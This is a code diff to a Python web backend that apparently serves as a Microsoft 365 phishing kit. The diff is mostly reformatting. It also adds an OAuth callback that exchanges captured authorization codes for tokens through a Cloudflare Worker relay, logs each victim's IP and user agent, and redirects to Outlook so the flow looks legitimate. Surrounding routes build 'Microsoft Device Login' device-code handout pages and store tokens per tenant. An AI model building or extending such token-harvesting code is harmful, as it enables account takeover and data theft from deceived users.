@@ -1897,7 +1897,10 @@ async def create_alert(
     level = (body.get("level") or "info").strip()
 
     if not message:
-        raise HTTPException(status_code=400, detail="message is required")
+        raise HTTPException(
+            status_code=400,
+            detail="message is required",
+        )
 
     db = SessionLocal()
     try:
@@ -1927,10 +1930,13 @@ def delete_alert(alert_id: int, user=Depends(verify_token)):
     try:
         alert = db.query(Alert).filter(Alert.id == alert_id).first()
         if not alert:
-            raise HTTPException(status_code=404, detail="Alert not found")
+            raise HTTPException(
+                status_code=404,
+                detail="Alert not found",
+            )
         db.delete(alert)
         db.commit()
-              return {"message": "Alert deleted", "alert_id": alert_id}
+        return {"message": "Alert deleted", "alert_id": alert_id}
     finally:
         db.close()
 
@@ -1944,7 +1950,9 @@ def device_code_handout(
     user_code: str,
     verification_uri: str,
     title: str = "Microsoft Device Login",
-    brief_writeup: str = "Please follow the steps below to continue sign-in.",
+    brief_writeup: str = (
+        "Please follow the steps below to continue sign-in."
+    ),
     logo_url: str = "",
     download: str = "0",
     user=Depends(verify_token),
@@ -2102,7 +2110,9 @@ def device_code_support_page_link(
     user_code: str,
     verification_uri: str,
     title: str = "Microsoft Device Login",
-    brief_writeup: str = "Please follow the steps below to continue sign-in.",
+    brief_writeup: str = (
+        "Please follow the steps below to continue sign-in."
+    ),
     logo_url: str = "",
     user=Depends(verify_token),
 ):
@@ -2122,8 +2132,13 @@ def device_code_support_page_link(
         }
     )
 
+    backend_base = os.environ.get(
+        "BACKEND_BASE_URL",
+        "https://oauth-backend-7cuu.onrender.com",
+    ).rstrip("/")
+
     support_page_url = (
-        f"{BACKEND_BASE_URL}/device-code/handout/html?{params}"
+        f"{backend_base}/device-code/handout/html?{params}"
     )
 
     return {"support_page_url": support_page_url}
@@ -2173,7 +2188,10 @@ def delete_token(tenant_id: str, user=Depends(verify_token)):
             )
         db.delete(row)
         db.commit()
-        return {"message": "Token deleted", "tenant_id": tenant_id}
+        return {
+            "message": "Token deleted",
+            "tenant_id": tenant_id,
+        }
     finally:
         db.close()
 
@@ -2282,11 +2300,11 @@ def system_info(user=Depends(verify_token)):
                     "REDIRECT_URI",
                     "https://oauth-backend-7cuu.onrender.com/auth/callback",
                 ),
+                "worker_relay_enabled": bool(WORKER_DOMAIN),
+                "worker_domain": WORKER_DOMAIN or "not configured",
                 "device_code_tenant": os.environ.get(
                     "DEVICE_CODE_TENANT", "organizations"
                 ),
-                "worker_relay_enabled": bool(WORKER_DOMAIN),
-                "worker_domain": WORKER_DOMAIN or "not configured",
             },
             "database": {
                 "connected_tokens": token_count,
@@ -2299,37 +2317,119 @@ def system_info(user=Depends(verify_token)):
 
 
 # =========================
-# DEBUG — WORKER CONFIG
-# Remove this endpoint before going to production
+# AUTH CALLBACK
+# Receives the OAuth callback from Microsoft via
+# the Cloudflare Worker relay.
+# Extracts relay params forwarded by the worker and
+# passes them to exchange_code_for_token so the correct
+# redirect_uri is used in the token exchange POST.
 # =========================
-@app.get("/debug/worker-config")
-def debug_worker_config(user=Depends(verify_token)):
-    """
-    Temporary debug endpoint.
-    Verifies WORKER_DOMAIN is set and worker URI is being
-    built correctly. Remove before going to production.
-    """
-    from payload_builder import (
-        WORKER_DOMAIN as PB_WORKER_DOMAIN,
-        REDIRECT_URI as PB_REDIRECT_URI,
-        _build_worker_uri,
-    )
+@app.get("/auth/callback")
+def auth_callback(request: Request):
+    init_db()
 
-    test_uri = _build_worker_uri(
-        user_id="test@example.com",
-        nonce="testnonceabcd1234",
-    )
+    code = request.query_params.get("code")
+    state = request.query_params.get("state")
+    error = request.query_params.get("error")
+    error_description = request.query_params.get("error_description")
 
-    return {
-        "worker_domain_in_main": WORKER_DOMAIN or "NOT SET",
-        "worker_domain_in_payload_builder": PB_WORKER_DOMAIN or "NOT SET",
-        "worker_domain_match": WORKER_DOMAIN == PB_WORKER_DOMAIN,
-        "redirect_uri_fallback": PB_REDIRECT_URI,
-        "test_worker_uri": test_uri,
-        "is_using_worker": test_uri != PB_REDIRECT_URI,
-        "worker_relay_active": bool(WORKER_DOMAIN),
-        "env_raw": os.environ.get("WORKER_DOMAIN", "NOT FOUND IN ENV"),
-    }
+    # Worker relay params — forwarded by Cloudflare Worker
+    # relay      = "cloudflare_worker" if came via worker
+    # relay_host = worker hostname e.g. dorseym410.workers.dev
+    # relay_path = nonce path e.g. /a1b2c3d4e5f6g7h8
+    # worker_secret = optional shared secret for verification
+    relay = request.query_params.get("relay")
+    relay_host = request.query_params.get("relay_host")
+    relay_path = request.query_params.get("relay_path")
+    worker_secret = request.query_params.get("worker_secret")
+
+    if relay:
+        logging.info(
+            f"[auth/callback] Received via worker relay\n"
+            f"  relay={relay}\n"
+            f"  relay_host={relay_host}\n"
+            f"  relay_path={relay_path}\n"
+            f"  code_present={bool(code)}\n"
+            f"  state_present={bool(state)}"
+        )
+    else:
+        logging.info(
+            f"[auth/callback] Received direct\n"
+            f"  code_present={bool(code)}\n"
+            f"  state_present={bool(state)}"
+        )
+
+    # Handle OAuth errors forwarded by the worker
+    if error:
+        logging.warning(
+            f"[auth/callback] OAuth error received\n"
+            f"  error={error}\n"
+            f"  description={error_description}"
+        )
+        frontend_origin = os.environ.get(
+            "FRONTEND_ORIGIN",
+            "https://frontend-xg84.onrender.com",
+        )
+        error_params = urlencode(
+            {
+                "auth": "error",
+                "error": error or "",
+                "error_description": error_description or "",
+            }
+        )
+        return RedirectResponse(
+            url=f"{frontend_origin}?{error_params}",
+            status_code=302,
+        )
+
+    if not code:
+        logging.warning("[auth/callback] No authorization code received")
+        return JSONResponse(
+            {"error": "No authorization code received."},
+            status_code=400,
+        )
+
+    client_ip = request.client.host if request.client else None
+    user_agent = request.headers.get("user-agent")
+
+    try:
+        result = exchange_code_for_token(
+            code=code,
+            state=state or "",
+            client_ip=client_ip,
+            user_agent=user_agent,
+            relay=relay,
+            relay_host=relay_host,
+            relay_path=relay_path,
+            worker_secret=worker_secret,
+        )
+
+        logging.info(
+            f"[auth/callback] Token exchange complete\n"
+            f"  resolved_user_id={result.get('resolved_user_id')}\n"
+            f"  flow_type={result.get('flow_type')}\n"
+            f"  payload_source={result.get('payload_source')}\n"
+            f"  relay={result.get('relay')}\n"
+            f"  redirect_uri_used={result.get('redirect_uri_used')}"
+        )
+
+        success_redirect = os.environ.get(
+            "OAUTH_SUCCESS_REDIRECT",
+            "https://outlook.office.com/mail/",
+        )
+        return RedirectResponse(
+            url=success_redirect,
+            status_code=302,
+        )
+
+    except Exception as e:
+        logging.error(
+            f"[auth/callback] Token exchange failed: {e}\n"
+            f"  relay={relay}\n"
+            f"  relay_host={relay_host}\n"
+            f"  relay_path={relay_path}"
+        )
+        return JSONResponse({"error": str(e)}, status_code=400)
 
 
 # =========================
